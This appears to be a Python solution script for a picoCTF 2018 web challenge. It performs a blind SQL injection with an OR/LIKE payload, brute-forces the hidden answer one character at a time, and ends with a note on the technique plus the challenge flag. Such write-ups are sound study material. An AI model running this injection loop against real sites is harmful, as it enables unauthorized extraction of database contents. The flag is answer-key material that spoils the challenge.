import requests
import string

url = "http://2018shell3.picoctf.com:36052/answer2.php"

payload = "' OR UPPER(answer) LIKE '{}%' -- "

answer = ""
charset = string.printable
while True:
    found = False
    for char in charset:
        candidate = answer + char
        r = requests.post(url, data={"answer": payload.format(candidate)})
        if "You are so" in r.text:
            found = True
            answer += char
            print(answer)
            break

    if not found:
        print("FAILED")
        break

"""
We can make use of the fact that the page tells us whether or not a row was returned and perform a blind SQL injection
attack using LIKE. With this, we can brute force the correct answer. However, LIKE is case-insensitive, so even
though the script produces an answer of 41andsixsixths, the correct answer is 41AndSixSixths.

picoCTF{qu3stions_ar3_h4rd_d3850719}
"""
